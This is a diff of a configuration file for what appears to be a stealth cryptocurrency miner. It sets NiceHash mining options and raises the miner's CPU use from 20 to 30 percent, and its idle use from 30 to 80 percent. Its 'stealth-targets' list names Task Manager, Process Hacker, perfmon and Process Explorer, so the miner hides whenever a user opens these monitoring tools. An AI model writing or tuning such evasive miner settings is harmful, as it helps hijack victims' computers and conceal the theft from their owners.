@@ -6,9 +6,9 @@
     "password": "new2",
     "nicehash": true,
     "ssltls": true,
-    "max-cpu": 20,
+    "max-cpu": 30,
     "idle-wait": 2,
-    "idle-cpu": 30,
+    "idle-cpu": 80,
     "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
     "kill-targets": "",
     "stealth-fullscreen": true
